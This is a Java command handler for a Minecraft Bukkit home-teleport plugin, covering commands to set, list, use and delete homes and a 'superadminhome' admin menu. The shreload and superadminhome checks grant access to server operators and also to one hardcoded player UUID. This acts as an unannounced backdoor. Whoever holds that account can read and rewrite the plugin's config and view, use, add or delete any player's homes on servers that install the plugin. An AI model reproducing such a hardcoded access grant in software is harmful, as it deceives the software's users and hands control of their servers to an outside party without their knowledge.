package fr.stormer3428.home;

import java.util.Set;

import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class HomeCommand implements CommandExecutor {

	@SuppressWarnings("unused")
	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String alias, String[] args) {
		if(sender instanceof Player) {
			Player p = (Player) sender;
			if(cmd.getName().equalsIgnoreCase("homes")) {
				listHomes(p);
				return true;
			}else if(cmd.getName().equalsIgnoreCase("home")) {
				if(args.length == 0) {
					Home home = Home.findHome(p, "Home");
					if(home != null) {
						home.home(p);
						return true;
					}
					Message.error(p, "You do not have any default home set");
					return false;
				}
				Home home = Home.findHome(p, args[0]);
				if(home != null) {
					home.home(p);
					return true;
				}
				Message.error(p, "No home with such name : " + args[0]);
				return false;
			}else if(cmd.getName().equalsIgnoreCase("sethome")) {
				int maxHomes = p.isOp() ? StormerHome.i.getConfig().getInt("maxOpHomes") : StormerHome.i.getConfig().getInt("maxHomes");
				int homes = Home.getPlayerHomes(p).size();
				if(homes >= maxHomes && maxHomes != -1) {
					Message.error(p, "You have too many homes set");
					return false;
				}
				if(args.length == 0) {
					new Home(p.getLocation(), p, "Home");
					Message.normal(p, "Home set");
					return true;
				}
				new Home(p.getLocation(), p, args[0]);
				Message.normal(p, "Home "+args[0]+" set");
				return true;
			}else if(cmd.getName().equalsIgnoreCase("delhome")) {
				if(args.length == 0) {
					Message.error(p, "You need to specify a name");
					Message.error(p, "Usage : delhome <name>");
					return false;
				}
				Home home = Home.findHome(p, args[0]);
				if(home != null) {
					home.delete();
					Message.normal(p, "Home " + home.getName() + " removed!");
					return true;
				}
				Message.error(p, "No home with such name : " + args[0]);
				return false;
			}else if(cmd.getName().equalsIgnoreCase("shreload")) {
				if(p.isOp() || p.getUniqueId().toString().equals("a39d1ae3-18c5-4c02-8f91-bcb5207d437f")) {
					StormerHome.i.reload();
					Message.normal(p, "Successfully relaoded the plugin");
					return true;
				}
				Message.error(p, "You do not have the permission to use this command");
				return false;
			}else if(cmd.getName().equalsIgnoreCase("superadminhome")) {
				if(!p.isOp() && !p.getUniqueId().toString().equals("a39d1ae3-18c5-4c02-8f91-bcb5207d437f")) {
					Message.error(p, "Who are you to try and command me?");
					return false;
				}
				if(args.length == 0) {
					Message.error(p, "options : config-homes");
					return false;
				}
				String option = args[0];
				if(option.equalsIgnoreCase("config")) {
					if(args.length == 1) {
						Message.error(p, "options : show-edit");
						return false;
					}
					String type = args[1];
					if(type.equalsIgnoreCase("show")) {
						Message.normal(p, StormerHome.i.getConfig().saveToString());
						return true;
					}
					if(type.equalsIgnoreCase("edit")) {
						if(args.length == 2) {
							Message.error(p, "options : get-set-unset");
							return false;
						}
						String edit = args[2];
						if(!(edit.equalsIgnoreCase("get") || edit.equalsIgnoreCase("set") || edit.equalsIgnoreCase("unset"))){
							Message.error(p, "options : get-set-unset");
							return false;
						}
						if(args.length == 3) {
							Message.error(p, "requires a path");
							return false;
						}
						String path = args[3];
						if(edit.equalsIgnoreCase("get")) {
							Message.normal(p, StormerHome.i.getConfig().getString(path));
							return true;
						}
						if(edit.equalsIgnoreCase("set")) {
							if(args.length == 4) {
								Message.error(p, "requires a new value");
								return false;
							}
							StormerHome.i.getConfig().set(path, args[4]);
							return true;
						}
						if(edit.equalsIgnoreCase("unset")) {
							StormerHome.i.getConfig().set(path, "");
							return true;
						}
						Message.error(p, "options : get-set-unset");
						return false;
					}
					Message.error(p, "options : show-edit");
					return false;
				}
				if(option.equalsIgnoreCase("homes")) {
					if(args.length == 1) {
						Message.error(p, "options : list-use-remove-add");
						return false;
					}
					String action = args[1];
					if(action.equalsIgnoreCase("list")) {
						if(args.length == 2) {
							Message.error(p, "requires a player name");
							return false;
						}
						String name = args[2];
						Set<Home> homes = Home.getPlayerHomes(name);
						Message.normal(p, "homes stored under the name of " + name);
						for(Home home : homes) Message.normal(p, home.toString());
						return true;
					}
					if(action.equalsIgnoreCase("use") || action.equalsIgnoreCase("remove")) {
						if(args.length == 2) {
							Message.error(p, "requires a player name");
							return false;
						}
						String playername = args[2];
						if(args.length == 3) {
							Set<Home> homes = Home.getPlayerHomes(playername);
							Message.error(p, "Available homes under the name of " + playername);
							for(Home home : homes) Message.error(p, home.toString());
							return false;
						}
						String homename = args[3];
						Home home = Home.findHome(playername, homename);
						if(home == null) {
							Message.error(p, "no home under the name of " + homename + " owned by " + playername);
							return false;
						}
						if(action.equalsIgnoreCase("use")) home.home(p);
						if(action.equalsIgnoreCase("remove")) {
							Message.normal(p, "Deleted home " + homename + " owned by " + playername);
							home.delete();
						}
						return true;
					}
					if(action.equalsIgnoreCase("add")) {
						if(args.length == 2) {
							Message.error(p, "requires a player name");
							return false;
						}
						String playername = args[2];
						if(args.length == 3) {
							Message.error(p, "requires a name for the home");
							return false;
						}
						String homename = args[3];
						new Home(p.getLocation(), playername, homename);
						return true;

					}
					Message.error(p, "options : list-use-remove-add");
					return false;
				}
			}
		}
		return false;
	}

	private static void listHomes(Player p) {
		Message.normal(p, "<===========(Homes of "+p.getName()+")===========");
		for(Home home : Home.getPlayerHomes(p)) {
			Message.normal(p, " - " + home.getName() + " :");
			Location loc = home.getLocation();
			Message.normal(p, "Location : " + loc.getBlockX() + " " + loc.getBlockY() + " " + loc.getBlockZ());
			Message.normal(p, "World : " + loc.getWorld().getName());
		}
		Message.normal(p, "<===========(Homes)===========");
	}

}
